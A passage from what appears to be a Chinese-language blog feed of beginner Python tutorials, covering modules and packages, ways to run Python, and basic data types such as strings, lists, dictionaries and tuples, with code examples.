<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> fibo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib = fibo.fib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir() <span class="comment"># 得到一个当前模块中定义的属性列表</span></span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__name__'</span>, <span class="string">'a'</span>, <span class="string">'fib'</span>, <span class="string">'fibo'</span>, <span class="string">'sys'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">5</span> <span class="comment"># 建立一个新的变量 'a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'a'</span>, <span class="string">'sys'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> a <span class="comment"># 删除变量名a</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'sys'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="标准模块"><a href="#标准模块" class="headerlink" title="标准模块"></a>标准模块</h3><p>Python 本身带着一些标准的模块库，在 Python 库参考文档中将会介绍到（就是后面的”库参考文档”）。</p>
<p>有些模块直接被构建在解析器里，这些虽然不是一些语言内置的功能，但是他却能很高效的使用，甚至是系统级调用也没问题。</p>
<p>这些组件会根据不同的操作系统进行不同形式的配置，比如 winreg 这个模块就只会提供给 Windows 系统。</p>
<p>应该注意到这有一个特别的模块 sys ，它内置在每一个 Python 解析器中。变量 sys.ps1 和 sys.ps2 定义了主提示符和副提示符所对应的字符串:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.ps1</span><br><span class="line"><span class="string">'&gt;&gt;&gt; '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.ps2</span><br><span class="line"><span class="string">'... '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.ps1 = <span class="string">'C&gt; '</span></span><br><span class="line">C&gt; print(<span class="string">'Yuck!'</span>)</span><br><span class="line">Yuck!</span><br><span class="line">C&gt;</span><br></pre></td></tr></table></figure>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包是一种管理 Python 模块命名空间的形式，采用”点模块名称”。</p>
<p>比如一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B 。</p>
<p>就好像使用模块的时候，你不用担心不同模块之间的全局变量相互影响一样，采用点模块名称这种形式也不用担心不同库之间的模块重名的情况。</p>
<p>这样不同的作者都可以提供 NumPy 模块，或者是 Python 图形库。</p>
<p>不妨假设你想设计一套统一处理声音文件和数据的模块（或者称之为一个”包”）。</p>
<p>现存很多种不同的音频文件格式（基本上都是通过后缀名区分的，例如： .wav，:file:.aiff，:file:.au，），所以你需要有一组不断增加的模块，用来在不同的格式之间转换。</p>
<p>并且针对这些音频数据，还有很多不同的操作（比如混音，添加回声，增加均衡器功能，创建人造立体声效果），所以你还需要一组怎么也写不完的模块来处理这些操作。</p>
<p>这里给出了一种可能的包结构（在分层的文件系统中）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sound&#x2F;                          顶层包</span><br><span class="line">      __init__.py               初始化 sound 包</span><br><span class="line">      formats&#x2F;                  文件格式转换子包</span><br><span class="line">              __init__.py</span><br><span class="line">              wavread.py</span><br><span class="line">              wavwrite.py</span><br><span class="line">              aiffread.py</span><br><span class="line">              aiffwrite.py</span><br><span class="line">              auread.py</span><br><span class="line">              auwrite.py</span><br><span class="line">              ...</span><br><span class="line">      effects&#x2F;                  声音效果子包</span><br><span class="line">              __init__.py</span><br><span class="line">              echo.py</span><br><span class="line">              surround.py</span><br><span class="line">              reverse.py</span><br><span class="line">              ...</span><br><span class="line">      filters&#x2F;                  filters 子包</span><br><span class="line">              __init__.py</span><br><span class="line">              equalizer.py</span><br><span class="line">              vocoder.py</span><br><span class="line">              karaoke.py</span><br><span class="line">              ...</span><br></pre></td></tr></table></figure>
<p>在导入一个包的时候，Python 会根据 sys.path 中的目录来寻找这个包中包含的子目录。</p>
<p>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。</p>
<p>最简单的情况，放一个空的 :file:<strong>init</strong>.py就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） <strong>all</strong>变量赋值。</p>
<p>用户可以每次只导入一个包里面的特定模块，比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sound.effects.echo</span><br></pre></td></tr></table></figure>
<p>这将会导入子模块:sound.effects.echo。 他必须使用全名去访问:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sound.effects.echo.echofilter(input, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>还有一种导入子模块的方法是:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sound.effects <span class="keyword">import</span> echo</span><br></pre></td></tr></table></figure>
<p>这同样会导入子模块: echo，并且他不需要那些冗长的前缀，所以他可以这样使用:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo.echofilter(input, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>还有一种变化就是直接导入一个函数或者变量:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sound.effects.echo <span class="keyword">import</span> echofilter</span><br></pre></td></tr></table></figure>
<p>同样的，这种方法会导入子模块: echo，并且可以直接使用他的 echofilter() 函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echofilter(input, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>注意当使用from package import item这种形式的时候，对应的item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量。</p>
<p>import语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。</p>
<p>反之，如果使用形如import item.subitem.subsubitem这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</p>
<h3 id="从一个包中导入"><a href="#从一个包中导入" class="headerlink" title="从一个包中导入*"></a>从一个包中导入*</h3><p>设想一下，如果我们使用 from sound.effects import *会发生什么？</p>
<p>Python 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。</p>
<p>但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。</p>
<p>在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。</p>
<p>（例如，Windows 95就很讨厌的把每一个文件的首字母大写显示）而且 DOS 的 8+3 命名规则对长模块名称的处理会把问题搞得更纠结。</p>
<p>为了解决这个问题，只能烦劳包作者提供一个精确的包的索引了。</p>
<p>导入语句遵循如下规则：如果包定义文件 <strong>init</strong>.py 存在一个叫做 <strong>all</strong> 的列表变量，那么在使用 from package import * 的时候就把这个列表中的所有名字作为包内容导入。</p>
<p>作为包的作者，可别忘了在更新包之后保证 <strong>all</strong> 也更新了啊。你说我就不这么做，我就不使用导入*这种用法，好吧，没问题，谁让你是老板呢。这里有一个例子，在:file:sounds/effects/<strong>init</strong>.py中包含如下代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__all__ = [<span class="string">"echo"</span>, <span class="string">"surround"</span>, <span class="string">"reverse"</span>]</span><br></pre></td></tr></table></figure>
<p>这表示当你使用from sound.effects import *这种用法时，你只会导入包里面这三个子模块。</p>
<p>如果 <strong>all</strong> 真的没有定义，那么使用from sound.effects import *这种语法的时候，就不会导入包 sound.effects 里的任何子模块。他只是把包sound.effects和它里面定义的所有内容导入进来（可能运行<strong>init</strong>.py里定义的初始化代码）。</p>
<p>这会把 <strong>init</strong>.py 里面定义的所有名字导入进来。并且他不会破坏掉我们在这句话之前导入的所有明确指定的模块。看下这部分代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sound.effects.echo</span><br><span class="line"><span class="keyword">import</span> sound.effects.surround</span><br><span class="line"><span class="keyword">from</span> sound.effects <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<p>这个例子中，在执行from…import前，包sound.effects中的echo和surround模块都被导入到当前的命名空间中了。（当然如果定义了<strong>all</strong>就更没问题了）</p>
<p>通常我们并不主张使用*这种方法来导入模块，因为这种方法经常会导致代码的可读性降低。不过这样倒的确是可以省去不少敲键的功夫，而且一些模块都设计成了只能通过特定的方法导入。</p>
<p>记住，使用from Package import specific_submodule这种方法永远不会有错。事实上，这也是推荐的方法。除非是你要导入的子模块有可能和其他包的子模块重名。</p>
<p>如果在结构中包是一个子包（比如这个例子中对于包sound来说），而你又想导入兄弟包（同级别的包）你就得使用导入绝对的路径来导入。比如，如果模块sound.filters.vocoder 要使用包sound.effects中的模块echo，你就要写成 from sound.effects import echo。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> echo</span><br><span class="line"><span class="keyword">from</span> .. <span class="keyword">import</span> formats</span><br><span class="line"><span class="keyword">from</span> ..filters <span class="keyword">import</span> equalizer</span><br></pre></td></tr></table></figure>
<p>无论是隐式的还是显式的相对导入都是从当前模块开始的。主模块的名字永远是”<strong>main</strong>“，一个Python应用程序的主模块，应当总是使用绝对路径引用。</p>
<p>包还提供一个额外的属性<strong>path</strong>。这是一个目录列表，里面每一个包含的目录都有为这个包服务的<strong>init</strong>.py，你得在其他<strong>init</strong>.py被执行前定义哦。可以修改这个变量，用来影响包含在包里面的模块和子包。</p>
<p>这个功能并不常用，一般用来扩展包里面的模块。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>本章主要参考以下文章教程<br><a href="http://www.runoob.com/python3/python3-conditional-statements.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-conditional-statements.html</a><br><a href="http://www.runoob.com/python3/python3-conditional-statements.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-conditional-statements.html</a><br><a href="http://www.runoob.com/python3/python3-iterator-generator.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-iterator-generator.html</a><br><a href="http://www.runoob.com/python3/python3-function.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-function.html</a></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python3 语法</tag>
      </tags>
  </entry>
  <entry>
    <title>运行python</title>
    <url>/2018/01/10/python/python101/python-2-%E8%BF%90%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="运行python"><a href="#运行python" class="headerlink" title="运行python"></a>运行python</h2><p>有三种运行python的方式。最简单的方式是交互式的启动解释器，每次输入一行python代码来执行。另外一种启动Python的方式就是运行python脚本。这样会调用相关的脚本解释器。最后一种方法就是用集成开发环境中的图形界面运行python。</p>
<h3 id="交互式的启动解释器"><a href="#交互式的启动解释器" class="headerlink" title="交互式的启动解释器"></a>交互式的启动解释器</h3><p>在命令行上启动解释器，就可以马上编写Python代码了</p>
<p><img src="https://huhansi.github.io/images/180129-start-cmd.png" alt="打开cmd窗口"></p>
<h3 id="打开控制台窗口"><a href="#打开控制台窗口" class="headerlink" title="打开控制台窗口"></a>打开控制台窗口</h3><p><img src="https://huhansi.github.io/images/180129-cmd-started.png" alt="cmd窗口"></p>
<p>进入python运行环境</p>
<p><img src="https://huhansi.github.io/images/180129-start-python.png" alt="进入运行环境"></p>
<p>现在就可以在<strong>&gt;&gt;&gt;</strong>提示符后输入python语句了， 例如：</p>
<p><img src="https://huhansi.github.io/images/180129-python-code-example.png" alt="输入python语句"></p>
<h3 id="运行python脚本"><a href="#运行python脚本" class="headerlink" title="运行python脚本"></a>运行python脚本</h3><p>这个步骤其实就是把刚才的语句保存到<strong>.py</strong>结尾的文件中，然后执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python code.py</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/180129-python-script-example.png" alt="执行python脚本"></p>
<h3 id="使用集成开发环境"><a href="#使用集成开发环境" class="headerlink" title="使用集成开发环境"></a>使用集成开发环境</h3><p>集成开发环境，又称之为IDE是一种集成了调试器、文本编辑器而且支持各种像CSV这样的源代码版本控制工具。</p>
<p>一般常见的有IDLE、PythonWin、Pycharm（推荐）</p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python基本类型</title>
    <url>/2018/01/10/python/python101/python-3-%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p>Python提供的基本数据类型主要有：空类型、布尔类型、整型、浮点型、字符串、列表、元组、集合、字典。</p>
<h2 id="整型（Int）"><a href="#整型（Int）" class="headerlink" title="整型（Int）"></a>整型（Int）</h2><p>整型，一般就是表示整数。在Python中，没有特别区分长整型和整型。一般超过32位之后，就自动当做长整型来处理。长整型在python中几乎没有范围限制。  </p>
<p><img src="https://huhansi.github.io/images/2%E7%9A%8410000%E6%AC%A1%E6%96%B9.PNG" alt="2的10000次方"></p>
<h2 id="浮点数（Float）"><a href="#浮点数（Float）" class="headerlink" title="浮点数（Float）"></a>浮点数（Float）</h2><p>也就是C语言中的double，java中的float和double。在运算中，整数和浮点数的运算结果也是浮点数。  </p>
<p><img src="https://huhansi.github.io/images/3%E9%99%A4%E4%BB%A52.PNG" alt="整数和浮点数运算"></p>
<p>注： <code>//</code> 表示对结果取整，直接舍弃小数点后面的数值。  </p>
<p><img src="https://huhansi.github.io/images/%E5%8F%96%E6%95%B4.PNG" alt="除法取整"></p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>在python中，被单引号<code>&#39;</code>或者双引号<code>&quot;</code>或者三引号<code>&quot;&quot;&quot;</code>包围起来的字符序列即为字符串。和其他语言一样，使用<code>\</code>进行转义。</p>
<p><img src="https://huhansi.github.io/images/%E5%AD%97%E7%AC%A6%E4%B8%B2.PNG" alt="字符串"></p>
<p>在python中可以使用<code>r</code>或者<code>u</code>来修饰字符串。<br>使用<code>r/R</code>修饰表示后面跟着的就是普通字符串。即，如果字符串中包含<code>\n</code>那么它也就是一个反斜杠字符和一个字母n，而不是表示换行符。</p>
<p><img src="https://huhansi.github.io/images/r%E5%AD%97%E7%AC%A6.PNG" alt="r修饰效果"><br>使用<code>u/U</code>修饰字符串表示unicode字符串。Unicode是书写国际文本的标准方法。如果你想要用非英语写文本,那么你需要有一个支持Unicode的编辑器。<br>类似地,Python允许你处理Unicode文本——你只需要在字符串前加上前缀u或U。</p>
<h3 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h3><p>使用<code>+</code>号拼接字符串</p>
<p><img src="https://huhansi.github.io/images/+%E5%8F%B7%E6%8B%BC%E6%8E%A5.PNG" alt="+号拼接"></p>
<p>乘法运算</p>
<p><img src="https://huhansi.github.io/images/%E4%B9%98%E6%B3%95%E8%BF%90%E7%AE%97.PNG" alt="乘法运算"><br>自动拼接</p>
<p><img src="https://huhansi.github.io/images/%E7%A9%BA%E6%A0%BC%E5%88%86%E5%89%B2.PNG" alt="自动拼接空格分割的字符串"><br>使用<code>len()</code>方法求字符串长度</p>
<p><img src="https://huhansi.github.io/images/%E6%B1%82%E9%95%BF%E5%BA%A6.PNG" alt="求对应字符串的长度"></p>
<p>取字符串对应下标的字符<br>同其他语言一样，字符串的索引是从0开始，到str.length - 1为止，超过就越界。</p>
<p><img src="https://huhansi.github.io/images/%E4%B8%8B%E6%A0%87%E5%8F%96%E5%80%BC%E5%92%8C%E8%B6%8A%E7%95%8C.PNG" alt="下标取值"><br>其他字符串用法可参见<a href="python-string-functions">python字符串内建函数</a></p>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>列表是python的基本数据结构之一，也是最常用的数据结构。和CPP、Java等语言不同，python的列表数据项不需要具有相同的类型。列表中的每个元素都分配一个数字-它的位置，或者索引，第一个索引是0，第二个索引是1，依次类推。</p>
<h3 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h3><p><code>foods = []    #创建空列表</code><br><code>foods = [1, 2, 3, 4, 5]    # 创建整型列表</code><br><code>foods = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;]  # 创建字符型列表</code><br><code>foods = [1, 2, 3, &#39;d&#39;, 1.2]    # 创建混合列表</code></p>
<p>还可以使用列表生成式来生成列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [x * x for x in range(5)]</span><br><span class="line">foods &#x3D; [x ** x for x in range(10) if x % 2 &#x3D;&#x3D; 0]</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E7%94%9F%E6%88%90%E5%BC%8F%E7%94%9F%E6%88%90%E5%88%97%E8%A1%A8.PNG" alt="列表生成式示例"></p>
<h3 id="访问列表"><a href="#访问列表" class="headerlink" title="访问列表"></a>访问列表</h3><p>使用for…in…迭代列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">for food in foods:</span><br><span class="line">    print(food)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%BF%AD%E4%BB%A3%E5%88%97%E8%A1%A8.PNG" alt="使用for...in...迭代列表"><br>使用索引取列表指定位置元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">print(foods[0])</span><br><span class="line">print(foods[5])</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%B4%A2%E5%BC%95%E5%8F%96%E5%80%BC.PNG" alt="索引从0开始，到list.length - 1 结束"></p>
<h3 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h3><p>可以对列表的数据项进行修改或者更新，也可以对列表进行增删。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; []    # 生成一个空列表</span><br><span class="line">foods.append(1)    # 向列表追加 1</span><br><span class="line">foods.append(2)    # 向列表追加 2</span><br><span class="line">foods[1] &#x3D; 3    # 将列表第二个元素值修改为 3</span><br><span class="line">fruits &#x3D; []    # 生成另一个空列表</span><br><span class="line">fruits.extend(food)    # 用foods列表来扩展fruits列表</span><br><span class="line">fruits.append(&#39;apple&#39;)    # 在fruits列表末追加 apple 项</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.PNG" alt="列表的增加，修改操作"></p>
<h3 id="删除列表"><a href="#删除列表" class="headerlink" title="删除列表"></a>删除列表</h3><p>使用<code>del</code>关键字删除列表元素</p>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E5%88%97%E8%A1%A8%E5%85%83%E7%B4%A0.PNG" alt="使用del删除列表元素"></p>
<h3 id="列表分片"><a href="#列表分片" class="headerlink" title="列表分片"></a>列表分片</h3><p>python中使用索引来取列表中特定位置的值。分片操作就是用来取一定范围内的值，它通过在方括号内用冒号隔开两个索引来实现，第一个索引是开始点，包括在结果之中，第二个索引的元素是结束点，不包括在结果之中。即，它取的是一个前闭后开的区间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string &#x3D; &#39;www.python.org&#39;    # 字符串也是一个列表</span><br><span class="line">string[4:10]    #取列表索引为4，到索引为10的，前闭后开区间中的字符串</span><br><span class="line">string[4:-4]    # 取列表索引为4，到从后往前第4个区间中的字符串</span><br><span class="line">string[:-1]    # 取索引为0，到最后一个字符为止，区间中的字符串</span><br><span class="line">string[::-1]    # -1 表示步长，即从末尾到首部，依次输出字符</span><br><span class="line">string[-1]    # 取最后一个字符</span><br><span class="line">string[-3]    # 取最后第3个字符</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E5%88%86%E7%89%87.PNG" alt="列表分片"><br>分片可以接受3个参数l[x:y:z]，其中x表示起始索引，如果留空，默认为列表的头部，同理，y留空，默认为列表的尾部，z表示步长，默认为1。</p>
<p><img src="https://huhansi.github.io/images/%E5%88%86%E7%89%87%E5%8F%82%E6%95%B0.PNG" alt="分片参数"></p>
<h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [x for x in range(5)]    # 生成一个列表，[1, 2, 3, 4, 5]</span><br><span class="line">print(len(foods))    # 计算列表长度</span><br><span class="line">[1, 2, 3] + [4, 5]    # 拼接两个列表</span><br><span class="line">[1] * 5    # 复制列表元素</span><br><span class="line">3 in [1] * 5    # false 3 是否在列表 [1] * 5 中</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C.PNG" alt="其他操作"></p>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典是另一种可变容器模型，且可存储任意类型对象。</p>
<p>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中 ,格式如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;key1 : value1, key2 : value2 &#125;</span><br></pre></td></tr></table></figure>
<p>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;    # 生成空字典</span><br><span class="line">d</span><br><span class="line">d &#x3D; &#123;&#39;a&#39;: 1, &#39;b&#39;: 2, &#39;b&#39;: &#39;3&#39;&#125;</span><br><span class="line">d[&#39;b&#39;]    # 从字典取键为b的值</span><br><span class="line">d</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8.PNG" alt="生成字典"><br>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。</p>
<p>一个简单的字典实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict &#x3D; &#123;&#39;Alice&#39;: &#39;2341&#39;, &#39;Beth&#39;: &#39;9102&#39;, &#39;Cecil&#39;: &#39;3258&#39;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B82.PNG" alt="生成字典"><br>也可如此创建字典：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict1 &#x3D; &#123; &#39;abc&#39;: 456 &#125;</span><br><span class="line">dict2 &#x3D; &#123; &#39;abc&#39;: 123, 98.6: 37 &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E4%B8%8D%E5%8F%AF%E5%8F%98%E9%94%AE.PNG" alt="不可变键"></p>
<h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><p>字典可以使用任意不变的对象作为键值，字符串、整型、元组等。列表是不可作为键值的，因为它是可变对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;    # 使用元组做键值</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0.PNG" alt="列表添加元素"></p>
<h3 id="访问和遍历元素"><a href="#访问和遍历元素" class="headerlink" title="访问和遍历元素"></a>访问和遍历元素</h3><p>可以直接使用键值key取字典中对应的值，也可以只用dict.keys()和dict.item()来遍历获取字典中所有键值对。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;</span><br><span class="line">print(d[&#39;name&#39;])</span><br><span class="line">for key in d.keys():    # 调用keys 遍历字典</span><br><span class="line">    print(d[key])</span><br><span class="line"></span><br><span class="line">for key, value in d.items():    # 调用items 获取键值对</span><br><span class="line">	print(key, value)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%AE%BF%E9%97%AE%E5%92%8C%E9%81%8D%E5%8E%86%E5%85%83%E7%B4%A0.PNG" alt="访问和遍历元素"><br>如果访问一个不在字典中的键值对，则会抛出一个异常。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;</span><br><span class="line">d[222]    # 获取不存在的元素，此处会抛出一个异常</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%85%83%E7%B4%A0.PNG" alt="获取不存在元素"></p>
<h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>使用python内置关键字<code>del</code>删除字典内元素；也可以调用字典内置函数clear() 清空字典元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;</span><br><span class="line">del d[&#39;name&#39;]    # 删除键为name的值</span><br><span class="line">del d    # 删除字典 d</span><br><span class="line">d    #    删除字典后，再访问，此处会抛出一个异常</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E5%85%83%E7%B4%A0.PNG" alt="删除元素"></p>
<h3 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h3><p>向字典中重复添加相同元素的键值对，后添加的键值对值会覆盖前添加的键值对的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&quot;name&quot;] &#x3D; &quot;huhansi&quot;</span><br><span class="line">d[&quot;name&quot;] &#x3D; &quot;huhansan&quot;</span><br><span class="line">print(d[&quot;name&quot;])</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E6%9B%B4%E6%96%B0%E5%85%83%E7%B4%A0.PNG" alt="更新元素"></p>
<h3 id="其他操作-1"><a href="#其他操作-1" class="headerlink" title="其他操作"></a>其他操作</h3><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>在Python中，元组（Tuple）和列表类似，两者之间的区别在于：元组不能更改，列表可以。也就是说，一旦被分配，就不能从元组中添加、更改或者删除元素。</p>
<h3 id="元素的优势"><a href="#元素的优势" class="headerlink" title="元素的优势"></a>元素的优势</h3><p>· 通常将元组用于不同的数据类型，将列表用于相同（或相似）的数据类型<br>· 由于元组不可变，所以遍历元组比列表要快（较小的性能提升）<br>· 元组可以用做字典的key，而列表不行。因为字典的key必须是不可变的，元组本身就是不可变的<br>· 如果数据不需要修改，可将其作为元组来实现，可以确保“写保护”<br>· 元组可以被用在字符串格式化中</p>
<h3 id="创建元组"><a href="#创建元组" class="headerlink" title="创建元组"></a>创建元组</h3><p>在Python中，元组的内置tuple类型定义。<br>要创建元组，需要将所有项（元素）放在括号（<code>()</code>）内，以逗号（<code>,</code>）分隔。括号是可选的，但是建议写上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; 1, 2, 3, 4, 5    # 创建元组，不使用括号</span><br><span class="line">t &#x3D; ()    # 空元组</span><br><span class="line">t &#x3D; (&#39;p&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;)    # 字符型元组</span><br><span class="line">t &#x3D; (1, 1.2, &quot;1.3&quot;)    # 混合型元组</span><br><span class="line">t &#x3D; (1, 2, (3, 4, 5))    # 嵌套型元组</span><br></pre></td></tr></table></figure>
